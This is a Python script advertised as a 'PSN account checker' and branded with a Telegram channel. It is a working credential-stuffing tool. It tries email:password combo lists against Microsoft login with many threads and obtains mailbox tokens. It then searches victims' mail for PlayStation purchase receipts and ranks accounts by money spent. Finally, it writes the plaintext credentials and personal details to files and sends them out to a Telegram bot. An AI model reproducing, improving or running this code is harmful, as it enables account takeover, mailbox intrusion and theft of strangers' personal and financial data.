#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
┌─────────────────────────────────────────────────────────────────┐
│              PSN ACCOUNT CHECKER v7.0 (FOCUS)                  │
│                      PlayStation Network Only                  │
│  💎 @pyabrodies  📢 https://t.me/HoTmIlToOLs                  │
└─────────────────────────────────────────────────────────────────┘
"""

import os
import sys
import re
import time
import random
import json
import hashlib
import threading
import configparser
import requests
from urllib.parse import unquote, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
from datetime import datetime, timedelta
from typing import Dict, List, Optional

try:
    from tqdm import tqdm
    TQDM_AVAILABLE = True
except ImportError:
    TQDM_AVAILABLE = False

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class Fore: RED=GREEN=YELLOW=BLUE=CYAN=MAGENTA=WHITE=RESET=""
    class Style: RESET_ALL=""

# ------------------------ CONFIGURATION ------------------------
CONFIG_FILE = "psn_config.ini"
DEFAULT_CONFIG = {
    'settings': {
        'threads': '10',
        'timeout': '30',
        'retries': '3',
        'debug': 'false',
        'max_messages': '100',
        'save_plain_passwords': 'true'
    },
    'telegram': {
        'bot_token': '',
        'chat_id': ''
    },
    'psn': {
        'client_id': 'e9b154d0-7658-433b-bb25-6b8e0a8a7c59',
        'redirect_uri': 'msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno=',
        'scope': 'https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/User.Read offline_access',
        'search_months': '6'
    }
}
banner = f"""{Fore.CYAN}
┌─────────────────────────────────────────────────────────────────┐
│                                                                                          │
│  ────Ѐ───Ј───Ѐ───Ѐ───Ѐ───Ѐ───Ѐ───Ѐ───Ѐ───Ѐ───Ѐ───Ѐ───Ѐ───Ѐ───Ѐ───Ѐ───Ѐ───Ѐ───Ѐ───Ѐ───              
│  ─ЁёўүӢүўүЎҹў©ўӢӢЈҪЎ»ӯўҪўүҜӯӯӯўҪЎҚў№ЎҚҷЈҜүүүүүЈҝў«үүүўүЎҹүўҝў№үўүЈүўҝЎқЎүў©ўҝЈ»ўҚүү©ў№ЈҹЎҸү№Ўүў»ЎҚЎҮ  
│  ─Ёёўў№ЀЀЁёҒЈјЀЈјЎқЀЀЁёҳЀЀЀЀҲўҝЀЎҹЎ„№ЈЈЀЀҗЀЁёЎҳЎ„ЈӨЀЎјҒЀўәЎҳүЀЀЀ«ЈӘЈҢЎҢўіЎ»ЈҰЀЀўғЎҪЎјЎЀўЈЁёёЎҮ      
│  ─ЁёЎёЁёЀЀЈҝЀЈҮўЎҝЀЀЀёЎҮЀЀЀЀЀҳўҮёҳЎЀ»ЈҮЀЀ„ЀЎҮўЈўӣЀЎҮЀЀЈёҮЀЀЀЀЀҳ„ў»ЎЀ»Ј»Ј§ЀЀғў§ЎҮЀЁёёЎҮЎҮ  
│  ─ЁёЎҮЁёЈЀЈҝўЈҝЎҫҒЀўЎЎӨўҮЈЀЈҗЈЀЀӨўЀҲўЎЎЎҲўҰЎҷЈ·ЎЀЀЀўҝҲў»ЈЎҒЀўЀҸЀЀЀўЀЀ„ЈЀЈҗЈЀЈҷўЎҢЈ»Ј·ЎЀў№ЁёЎ…ЀЁёёЎҮЎҮ  
│  ─ЁёЎҮЁёЈҹЀўҝЁёЎҝЀЈЀЈ¶Ј·ЈҫЎҝҝЈҝЈҝЈҝЈҝЈҝЈ¶Ј¬ЎЀҗ°Ј„ҷӘЈ»ЈҰЎЀҳЈ§Ѐҷ„ЀЀЀЀЀЈЁЈҙЈҫЈҝҝЈҝЈҝЈҝЈҝЈҝЈ¶ЈҜЈҝЈјўјЎҮЀЁёЎҮЎҮЎҮ  
│  ─Ёёў§ЀЈҝЎ…ЁёЈјЎ·ЈҫЈҝЎҹӢЈҝ“ўІЈҝЈҝЈҝЎҹҷЈҝӣўҜЎіЎЀҲ“„ЎҲҡҝЈ§ЈҢў§ЀЀЀЀЀЈЈәҹў«Ўҝ“ўәЈҝЈҝЈҝҸҷЈҸӣЈҝЈҝЈҫЎҮўЎҝўЀЎҮ  
│  ─ЁёЁёЀў№Ј·ЎЀўҝЎҒЀ»ЈҮЀЈҮЀҳЈҝЈҝЎҝҒҗЈүЎЀЀҒЀЀЀЀЀЀЀЀү“ів„ЀЀЀЀӢЀҳЎҮЀёЈҝЈҝҹЀўҲЈүўЎҝҒЈјҒЈјғЈјЀЎҮ  
│  ─ЁёёЈЀҲЈҜўіЎҳЈҮЀЀҲЎӮЈңЈ¶ЎЀЀЀўЀЈЀЎҙҮЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀўҪЈ¶ЈЀЀЀЈЀЈң•ЎЊЀЈёҮЈјЎҹўҸЀЎҮ  
│  ─ЁёЀЎҹЀЁёЎ¶ў№ЎңЎ¶ЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀўӢЈҫЎҸЎҮЎҺЎҮЀЎҮ  
│  ─ЁёЀўғЎ¶ЀўҝЎ„‘ўҪЈ„ЀЀЀўЀӮўҒҲ„ЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀЀӮЀЀЀЀЀЀЀЀЀЀЀЀЎЀЀ„ЎҗўЀӮЀЀЈЈ®Ўҹў№ЈҜЈёЈұҒЀЎҮ  
│  ─ҲүүӢүүӢүүүӢүүүүүүүүүүүүүүүүүүүүүүүүүүүүүүүүүүүүүүүүүӢЎҹүүЎҝӢӢӢүүҒ  
│                                                                               
│                  PSN ACCOUNT CHECKER                 
│  Version 1. - create by @pyabrodies  https://t.me/HoTmIlToOLs      │
└─────────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}"""
def load_config():
    config = configparser.ConfigParser()
    if os.path.exists(CONFIG_FILE):
        config.read(CONFIG_FILE)
    else:
        for section, values in DEFAULT_CONFIG.items():
            config[section] = values
        with open(CONFIG_FILE, 'w') as f:
            config.write(f)
    return config

config = load_config()
CONFIG_VARS = {
    'TIMEOUT': int(config['settings']['timeout']),
    'RETRIES': int(config['settings']['retries']),
    'THREADS': int(config['settings']['threads']),
    'DEBUG': config['settings'].getboolean('debug'),
    'MAX_MESSAGES': int(config['settings']['max_messages']),
    'SAVE_PLAIN': config['settings'].getboolean('save_plain_passwords'),
    'CLIENT_ID': config['psn']['client_id'],
    'REDIRECT_URI': config['psn']['redirect_uri'],
    'SCOPE': config['psn']['scope'],
    'SEARCH_MONTHS': int(config['psn']['search_months']),
    'BOT_TOKEN': config['telegram']['bot_token'],
    'CHAT_ID': config['telegram']['chat_id']
}

# ------------------------ UTILITIES ------------------------
def ensure_dir(path):
    dirpath = os.path.dirname(path)
    if dirpath:
        os.makedirs(dirpath, exist_ok=True)

def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

def save_to_file(filename, content, folder="Results/PSN", password=None):
    ensure_dir(f"{folder}/")
    if password and not CONFIG_VARS['SAVE_PLAIN']:
        content = content.replace(password, hash_password(password))
    with open(f"{folder}/{filename}", "a", encoding="utf-8") as f:
        f.write(content + "\n")

def send_telegram(text):
    if CONFIG_VARS['BOT_TOKEN'] and CONFIG_VARS['CHAT_ID']:
        try:
            requests.post(
                f"https://api.telegram.org/bot{CONFIG_VARS['BOT_TOKEN']}/sendMessage",
                json={'chat_id': CONFIG_VARS['CHAT_ID'], 'text': text[:4096]},
                timeout=10
            )
        except:
            pass

# ------------------------ MICROSOFT LOGIN ------------------------
def extract_form_data(html):
    soup = BeautifulSoup(html, 'html.parser')
    ppft = soup.find('input', {'name': 'PPFT'})
    ppft = ppft['value'] if ppft else None
    form = soup.find('form', {'method': 'post'})
    post_url = form['action'].replace('\\/', '/') if form and form.get('action') else None
    canary = soup.find('input', {'name': 'canary'})
    canary = canary['value'] if canary else ""
    if not ppft:
        match = re.search(r'name="PPFT"\s+value="([^"]+)"', html)
        ppft = match.group(1) if match else None
    if not post_url:
        match = re.search(r'urlPost:\s*[\'"]([^\'"]+)[\'"]', html)
        post_url = match.group(1).replace('\\/', '/') if match else "https://login.live.com/ppsecure/post.srf"
    return ppft, post_url, canary

def microsoft_login(email, password):
    for attempt in range(CONFIG_VARS['RETRIES']):
        session = requests.Session()
        session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        try:
            login_page = session.get('https://login.live.com/', timeout=CONFIG_VARS['TIMEOUT'])
            if login_page.status_code != 200:
                time.sleep(random.uniform(1,3))
                continue
            ppft, post_url, canary = extract_form_data(login_page.text)
            if not ppft:
                time.sleep(random.uniform(1,3))
                continue

            data = {
                'login': email, 'loginfmt': email, 'passwd': password,
                'PPFT': ppft, 'PPSX': 'PassportR', 'type': '11',
                'LoginOptions': '1', 'NewUser': '1', 'i13': '1', 'i19': '9960',
                'canary': canary, 'ctx': '', 'hpgrequestid': ''
            }
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://login.live.com', 'Referer': login_page.url,
                'User-Agent': session.headers['User-Agent']
            }
            resp = session.post(post_url, data=data, headers=headers, allow_redirects=True, timeout=CONFIG_VARS['TIMEOUT'])
            final_url = resp.url
            final_text = resp.text.lower()

            if 'identity/confirm' in final_url or '2fa' in final_text:
                return {'status': '2FA', 'token': None, 'profile': {}}
            if '/abuse' in final_url or '/cancel' in final_url:
                return {'status': 'LOCKED', 'token': None, 'profile': {}}
            if 'incorrect' in final_text or 'wrong' in final_text:
                return {'status': 'BAD', 'token': None, 'profile': {}}

            if 'outlook.live.com' in final_url or 'account.microsoft.com' in final_url:
                if 'access_token=' in final_url:
                    token_match = re.search(r'access_token=([^&]+)', final_url)
                    if token_match:
                        token = unquote(token_match.group(1))
                        profile = get_profile(token)
                        return {'status': 'SUCCESS', 'token': token, 'profile': profile}
                if 'code=' in final_url:
                    code = re.search(r'code=([^&]+)', final_url).group(1)
                    token_data = {
                        'client_id': CONFIG_VARS['CLIENT_ID'],
                        'grant_type': 'authorization_code',
                        'code': code,
                        'redirect_uri': CONFIG_VARS['REDIRECT_URI'],
                        'scope': CONFIG_VARS['SCOPE']
                    }
                    token_resp = session.post(
                        'https://login.microsoftonline.com/consumers/oauth2/v2.0/token',
                        data=token_data, timeout=CONFIG_VARS['TIMEOUT']
                    )
                    if token_resp.status_code == 200:
                        token_json = token_resp.json()
                        token = token_json.get('access_token')
                        if token:
                            profile = get_profile(token)
                            return {'status': 'SUCCESS', 'token': token, 'profile': profile}
                if 'ESTSAUTH' in session.cookies.get_dict():
                    return {'status': 'VALID_NO_TOKEN', 'token': None, 'profile': {}}
            return {'status': 'BAD', 'token': None, 'profile': {}}

        except Exception as e:
            time.sleep(random.uniform(1,3))
            continue
    return {'status': 'ERROR', 'token': None, 'profile': {}}

def get_profile(token):
    try:
        headers = {'Authorization': f'Bearer {token}'}
        resp = requests.get('https://graph.microsoft.com/v1.0/me', headers=headers, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            return {
                'name': data.get('displayName', 'Unknown'),
                'country': data.get('country', 'Unknown'),
                'birth_date': data.get('birthDate', 'Unknown')
            }
    except:
        pass
    return {'name': 'Unknown', 'country': 'Unknown', 'birth_date': 'Unknown'}

# ------------------------ PSN SCANNER ------------------------
class PSNSearcher:
    PSN_SENDERS = [
        "sony@txn-email.playstation.com",
        "Sony@email.sonyentertainmentnetwork.com",
        "sony@txn-email01.playstation.com",
        "sony@txn-email02.playstation.com",
        "sony@txn-email03.playstation.com",
        "playstation@email.sonyentertainmentnetwork.com",
        "noreply@playstation.com"
    ]

    def __init__(self, token):
        self.token = token
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {token}',
            'ConsistencyLevel': 'eventual'
        })

    def search_messages(self, query, max_messages=CONFIG_VARS['MAX_MESSAGES']):
        url = "https://graph.microsoft.com/v1.0/me/messages"
        params = {
            '$search': f'"{query}"',
            '$top': 50,
            '$select': 'body,subject,from,receivedDateTime',
            '$orderby': 'receivedDateTime desc'
        }
        messages = []
        while len(messages) < max_messages:
            resp = self.session.get(url, params=params, timeout=CONFIG_VARS['TIMEOUT'])
            if resp.status_code != 200:
                break
            data = resp.json()
            batch = data.get('value', [])
            messages.extend(batch)
            if len(messages) >= max_messages:
                messages = messages[:max_messages]
                break
            next_link = data.get('@odata.nextLink')
            if not next_link:
                break
            url = next_link
            params = None
        return messages

    def get_psn_emails(self):
        query = " OR ".join([f'from:"{s}"' for s in self.PSN_SENDERS])
        if CONFIG_VARS['SEARCH_MONTHS'] > 0:
            since = (datetime.now() - timedelta(days=30*CONFIG_VARS['SEARCH_MONTHS'])).strftime('%Y-%m-%d')
            query += f' AND received>={since}'
        return self.search_messages(query)

    def parse_email(self, msg):
        result = {
            'order_number': None,
            'game_title': None,
            'amount': None,
            'type': None
        }
        body = msg.get('body', {}).get('content', '') or msg.get('bodyPreview', '')

        m = re.search(r'Order Number:\s*([A-Z0-9-]+)', body, re.I)
        if m: result['order_number'] = m.group(1)

        m = re.search(r'(?:purchased|bought|Thank you for buying)\s+["\']?([^"\']+?)["\']?', body, re.I)
        if m: result['game_title'] = m.group(1).strip()
        if not result['game_title']:
            m = re.search(r'(?:purchase of|bought)\s+[\'"]?([^\'"]{5,60}?)(?:\s+for|\s+from|\s+\(|$)', body, re.I)
            if m: result['game_title'] = m.group(1).strip()
        if not result['game_title']:
            m = re.search(r'Product:\s*([^\n]{5,60})', body, re.I)
            if m: result['game_title'] = m.group(1).strip()

        m = re.search(r'\$(\d+\.?\d*)', body)
        if m: result['amount'] = float(m.group(1))

        if 'playstation plus' in body.lower() or 'ps plus' in body.lower():
            result['type'] = 'ps_plus'
        elif 'wallet' in body.lower() and 'top-up' in body.lower():
            result['type'] = 'wallet_topup'
        elif 'refund' in body.lower():
            result['type'] = 'refund'
        elif result['amount']:
            result['type'] = 'purchase'

        return result

    def extract_online_id(self, msg):
        body = msg.get('body', {}).get('content', '') or msg.get('bodyPreview', '')
        patterns = [
            r'Online ID:\s*([a-zA-Z0-9_-]{3,20})',
            r'Signed in as:\s*([a-zA-Z0-9_-]{3,20})',
            r'Hello,\s*([a-zA-Z0-9_-]{3,20})',
            r'Welcome back,\s*([a-zA-Z0-9_-]{3,20})',
            r'PSN ID:\s*([a-zA-Z0-9_-]{3,20})',
            r'Gamertag:\s*([a-zA-Z0-9_-]{3,20})',
            r'Account:\s*([a-zA-Z0-9_-]{3,20})'
        ]
        for pat in patterns:
            m = re.search(pat, body, re.I)
            if m:
                return m.group(1)
        return None

    def analyze(self):
        emails = self.get_psn_emails()
        if not emails:
            return None

        orders = []
        online_ids = set()
        total_spent = 0
        games = []
        ps_plus = False

        for msg in emails:
            parsed = self.parse_email(msg)
            if parsed['order_number']:
                orders.append(parsed)
            if parsed['amount']:
                total_spent += parsed['amount']
                if parsed['game_title']:
                    games.append(parsed['game_title'])
            if parsed['type'] == 'ps_plus':
                ps_plus = True
            oid = self.extract_online_id(msg)
            if oid:
                online_ids.add(oid)

        score = 0
        if total_spent > 500: score += 4
        elif total_spent > 200: score += 3
        elif total_spent > 50: score += 2
        elif total_spent > 0: score += 1
        if len(orders) > 20: score += 4
        elif len(orders) > 10: score += 3
        elif len(orders) > 3: score += 2
        elif len(orders) > 0: score += 1
        if ps_plus: score += 2
        if online_ids: score += 1

        if score >= 8: rank = "PREMIUM"
        elif score >= 5: rank = "GOOD"
        elif score >= 3: rank = "BASIC"
        elif score >= 1: rank = "LOW"
        else: rank = "NONE"

        return {
            'emails_count': len(emails),
            'orders': len(orders),
            'total_spent': total_spent,
            'games': list(set(games))[:5],
            'ps_plus': ps_plus,
            'online_ids': list(online_ids),
            'score': score,
            'rank': rank
        }

# ------------------------ MAIN ------------------------
def main():
    global banner
    print(banner)

    combo_file = input(f"{Fore.YELLOW}[+] Enter combo file path: {Style.RESET_ALL}").strip()
    if not os.path.exists(combo_file):
        print(f"{Fore.RED}File not found!{Style.RESET_ALL}")
        return

    combos = []
    with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if ':' in line:
                combos.append(line.split(':', 1))
    if not combos:
        print(f"{Fore.RED}No valid combos found!{Style.RESET_ALL}")
        return

    token_input = input(f"{Fore.YELLOW}[+] Telegram bot token (optional): {Style.RESET_ALL}").strip()
    if token_input:
        CONFIG_VARS['BOT_TOKEN'] = token_input
        chat_input = input(f"{Fore.YELLOW}[+] Telegram chat ID: {Style.RESET_ALL}").strip()
        if chat_input:
            CONFIG_VARS['CHAT_ID'] = chat_input

    try:
        threads = int(input(f"{Fore.YELLOW}[+] Threads (default 10): {Style.RESET_ALL}") or "10")
    except:
        threads = 10
    CONFIG_VARS['THREADS'] = min(threads, 30)

    print(f"\n{Fore.GREEN}Loaded {len(combos)} combos. Starting check...{Style.RESET_ALL}\n")

    stats = {'success':0, 'valid_notoken':0, 'bad':0, 'checked':0, 'total':len(combos)}
    lock = threading.Lock()
    start_time = time.time()

    def process(email, password):
        res = microsoft_login(email, password)
        with lock:
            stats['checked'] += 1
            if res['status'] == 'SUCCESS':
                stats['success'] += 1
                searcher = PSNSearcher(res['token'])
                psn = searcher.analyze()
                profile = res['profile']

                output = f"Email: {email}\nPassword: {password}\nName: {profile['name']}\nCountry: {profile['country']}\nBirth: {profile['birth_date']}\n"
                if psn:
                    output += f"\n🎮 PSN Stats:\n  • Emails: {psn['emails_count']}\n  • Orders: {psn['orders']}\n  • Spent: ${psn['total_spent']:.2f}\n  • PS Plus: {'Yes' if psn['ps_plus'] else 'No'}\n  • Score: {psn['score']}\n  • Rank: {psn['rank']}\n"
                    if psn['online_ids']:
                        output += f"  • Online IDs: {', '.join(psn['online_ids'])}\n"
                    if psn['games']:
                        output += f"  • Games: {', '.join(psn['games'])}\n"
                else:
                    output += "\n🎮 No PSN emails found.\n"

                save_to_file("PSN_Hits.txt", output, password=password)
                send_telegram(output)
                print(f"{Fore.GREEN}[+] HIT: {email} - {psn['rank'] if psn else 'No PSN'}{Style.RESET_ALL}")
            elif res['status'] == 'VALID_NO_TOKEN':
                stats['valid_notoken'] += 1
                save_to_file("Valid_No_Token.txt", f"{email}:{password}", password=password)
                print(f"{Fore.CYAN}[✓] VALID (no token): {email}{Style.RESET_ALL}")
            elif res['status'] == '2FA':
                save_to_file("2FA.txt", f"{email}:{password}", password=password)
                print(f"{Fore.YELLOW}[!] 2FA: {email}{Style.RESET_ALL}")
            else:
                stats['bad'] += 1
                print(f"{Fore.RED}[-] BAD: {email}{Style.RESET_ALL}")

            elapsed = time.time() - start_time
            cpm = (stats['checked'] / elapsed) * 60 if elapsed > 0 else 0
            print(f"\r{Fore.WHITE}Progress: {stats['checked']}/{stats['total']} | "
                  f"CPM: {cpm:.0f} | HIT: {stats['success']} | "
                  f"Valid: {stats['valid_notoken']} | Bad: {stats['bad']}{Style.RESET_ALL}", end='')

    with ThreadPoolExecutor(max_workers=CONFIG_VARS['THREADS']) as executor:
        futures = [executor.submit(process, email, pwd) for email, pwd in combos]
        for future in as_completed(futures):
            future.result()

    print("\n\n" + "="*50)
    print(f"{Fore.GREEN}✅ CHECK COMPLETED")
    print(f"{Fore.GREEN}✓ HIT (PSN data): {stats['success']}")
    print(f"{Fore.CYAN}✓ Valid (no token): {stats['valid_notoken']}")
    print(f"{Fore.YELLOW}⚠ 2FA: {stats['checked'] - stats['success'] - stats['valid_notoken'] - stats['bad']}")
    print(f"{Fore.RED}✗ Bad: {stats['bad']}")
    print(f"{Fore.WHITE}📁 Results saved in Results/PSN/")
    print(f"{Fore.MAGENTA}💎 @pyabrodies")
    print(f"{Fore.CYAN}📢 https://t.me/HoTmIlToOLs {Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Interrupted.{Style.RESET_ALL}")
        sys.exit(0)